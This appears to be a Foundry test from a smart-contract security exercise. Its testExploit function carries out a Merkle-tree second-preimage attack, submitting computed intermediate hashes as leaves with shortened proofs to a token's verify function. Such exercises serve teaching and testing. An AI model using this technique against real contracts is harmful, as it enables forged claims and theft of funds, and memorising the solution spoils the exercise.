// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadLeafBaseTest} from "./BadLeafBase.t.sol";

contract BadLeafTest is BadLeafBaseTest {
    function testExploit() external validation {
        bytes32 proof0 = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;
        bytes32 proof1 = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
        bytes32 leaf0 = token.getLeafNode(user0, 5);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = proof1;
        bytes32[] memory proof2 = new bytes32[](0);
        bytes32 hash_01 = keccak256(abi.encode(leaf0, proof0)); // order of arguments depends on _hashPair in MerkleProof.sol
        bytes32 hash_02 = keccak256(abi.encode(proof1, hash_01)); // order of arguments depends on _hashPair in MerkleProof.sol
        token.verify(proof, hash_01);
        token.verify(proof2, hash_02);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
